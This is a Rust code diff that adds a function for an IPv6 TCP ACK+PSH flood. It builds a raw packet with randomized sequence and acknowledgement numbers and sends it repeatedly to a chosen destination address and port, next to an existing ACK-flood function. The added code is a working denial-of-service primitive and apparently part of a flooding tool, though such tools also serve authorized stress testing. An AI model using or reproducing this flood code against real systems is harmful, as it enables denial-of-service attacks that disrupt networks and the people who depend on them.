@@ -74,6 +74,39 @@ pub fn send_ack_flood_packet(
     Ok(())
 }
 
+pub fn send_ack_psh_flood_packet(
+    src_ipv6: Ipv6Addr,
+    src_port: u16,
+    dst_ipv6: Ipv6Addr,
+    dst_port: u16,
+    max_same_packet: usize,
+) -> Result<()> {
+    let (mut tcp_tx, _) = return_layer4_tcp6_channel(TCP_BUFF_SIZE)?;
+
+    // tcp header
+    let mut rng = rand::thread_rng();
+    let mut tcp_buff = [0u8; TCP_HEADER_LEN + TCP_DATA_LEN];
+    let mut tcp_header = MutableTcpPacket::new(&mut tcp_buff[..]).unwrap();
+    tcp_header.set_source(src_port);
+    tcp_header.set_destination(dst_port);
+    tcp_header.set_sequence(rng.gen());
+    tcp_header.set_acknowledgement(rng.gen());
+    tcp_header.set_reserved(0);
+    tcp_header.set_flags(TcpFlags::ACK | TcpFlags::PSH);
+    tcp_header.set_urgent_ptr(0);
+    tcp_header.set_window(1024);
+    tcp_header.set_data_offset(5);
+    let checksum = ipv6_checksum(&tcp_header.to_immutable(), &src_ipv6, &dst_ipv6);
+    tcp_header.set_checksum(checksum);
+
+    for _ in 0..max_same_packet {
+        match tcp_tx.send_to(&tcp_header, dst_ipv6.into()) {
+            _ => (),
+        }
+    }
+    Ok(())
+}
+
 #[cfg(test)]
 mod tests {
     use super::*;
